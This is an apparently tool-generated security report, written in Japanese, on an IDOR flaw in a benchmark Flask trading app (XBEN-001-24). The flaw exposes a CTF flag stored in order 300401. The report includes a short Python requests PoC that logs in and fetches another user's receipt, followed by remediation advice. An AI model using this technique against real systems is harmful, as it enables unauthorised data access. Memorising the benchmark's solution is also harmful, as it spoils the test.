# Security Analysis: __init__.py - File operations resource

## ファイル情報

- **ファイルパス**: `/Users/hikae/ghq/github.com/HikaruEgashira/parsentry-claude-code-integration/benchmarks/benchmarks/XBEN-001-24/app/website/app/__init__.py`
- **検出パターン**: File operations resource

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id (URL parameter)**: Untrusted
  - Context: URLパスパラメータとして攻撃者が制御可能なorder_id
  - Risk Factors: ユーザー入力, 直接オブジェクト参照, 予測可能なID
- **session['user_id']**: SemiTrusted
  - Context: セッションに保存されたユーザーID（認証済み）
  - Risk Factors: 認証のみで認可チェックなし

### Actions (セキュリティ制御)

- **session.get('user_id') check**: Insufficient
  - Function: ユーザーがログインしているかの確認
  - Weaknesses: 認可チェックの欠如, オブジェクトレベルのアクセス制御なし
  - Bypass Vectors: 有効なセッションを持つ任意のユーザーが他のオーダーにアクセス可能

### Resources (操作対象)

- **Order.query.get(order_id)**: Critical
  - Operation: データベース読み取り
  - Protection: 認証チェックのみ（不十分）
- **open('/flag').read()**: Critical
  - Operation: ファイル読み取り
  - Protection: なし - 初期化時に実行

### Policy Violations

#### IDOR-001: オブジェクトレベルの認可チェックが必要

- **Path**: order_id (URL param) -> session.get() (認証のみ) -> Order.query.get() (機密データ)
- **Severity**: critical
- **Confidence**: 0.90

#### SENS-001: 機密ファイルの内容をデータベースに保存すべきではない

- **Path**: open('/flag') -> flag_content -> Order.receipt (データベース)
- **Severity**: high
- **Confidence**: 0.95

## マッチしたソースコード

```code
open('/flag')
```

## 詳細解析

このFlaskベースの取引プラットフォームには、**重大なIDOR（Insecure Direct Object Reference）脆弱性**が存在します。

**脆弱性の詳細:**

1. **機密データの露出**: `/flag`ファイルの内容がOrder（id=300401）のreceiptフィールドに保存されています（__init__.py:85-96）。このオーダーはuser_idが設定されておらず、どのユーザーにも紐づいていません。

2. **認可チェックの欠如**: `/order/<int:order_id>/receipt`エンドポイント（routes.py:94-106）では、ユーザーがログインしているかのみを確認し、そのオーダーがリクエストしているユーザーに属するかを検証していません。

3. **攻撃シナリオ**: 認証済みの攻撃者は、URLパラメータのorder_idを300401に変更することで、フラグ（機密情報）を含むreceiptにアクセスできます。

**追加の問題:**
- ハードコードされたsecret_key（行11）
- データベース認証情報がコード内に平文で記載（行14）
- パスワードが平文で保存（models.py:8）

## PoC（概念実証コード）

```text
# IDOR脆弱性のPoCコード
# このコードは脆弱性の実証用であり、実行は推奨しません

import requests

# Step 1: ログインしてセッションを取得
session = requests.Session()
base_url = "http://target-app:5000"

# ログインフォームを送信
login_data = {
    "username": "test"
}
session.post(f"{base_url}/", data=login_data)

# パスワードを送信
password_data = {
    "password": "test"
}
session.post(f"{base_url}/password/test", data=password_data)

# Step 2: IDOR脆弱性を悪用してフラグを取得
# order_id=300401はフラグを含むオーダー
response = session.get(f"{base_url}/order/300401/receipt")

print("Response:")
print(response.text)
# フラグの内容がreceiptフィールドに含まれて返される
```

## 修復ガイダンス

### /order/<int:order_id>/receipt エンドポイント

- **Required**: オブジェクトレベルの認可チェックを追加
- **Guidance**: Order.query.get(order_id)の後に、order.user_id == session.get('user_id')を検証し、不一致の場合は403エラーを返す
- **Priority**: critical

### 機密データの取り扱い

- **Required**: フラグなどの機密情報をデータベースに保存しない
- **Guidance**: 機密情報は環境変数や専用のシークレット管理システムで管理し、アプリケーションデータベースに保存しない
- **Priority**: critical

### secret_key

- **Required**: ハードコードされたシークレットキーを環境変数に移動
- **Guidance**: app.secret_key = os.environ.get('SECRET_KEY')を使用
- **Priority**: high

### データベース認証情報

- **Required**: 認証情報をコードから分離
- **Guidance**: 環境変数DATABASE_URLを使用してデータベース接続文字列を設定
- **Priority**: high

## 解析ノート

このFlaskアプリケーションを分析した結果、明確なIDOR脆弱性を発見しました。

1. __init__.py: 初期化時に/flagファイルの内容を読み取り、ユーザーに紐づかないOrder（id=300401）のreceiptフィールドに保存しています。

2. routes.py: /order/<int:order_id>/receiptエンドポイントで、ログインしているユーザーがそのオーダーの所有者かどうかを確認せずに、任意のorder_idでオーダーを取得できます。コメントでも明示的にIDOR脆弱性が記載されています。

3. 攻撃パス: 認証済みユーザーがorder_id=300401にアクセスすることで、/flagの内容を含むreceiptを閲覧できます。このオーダーにはuser_idが設定されていないため、どのユーザーにも紐づいていません。

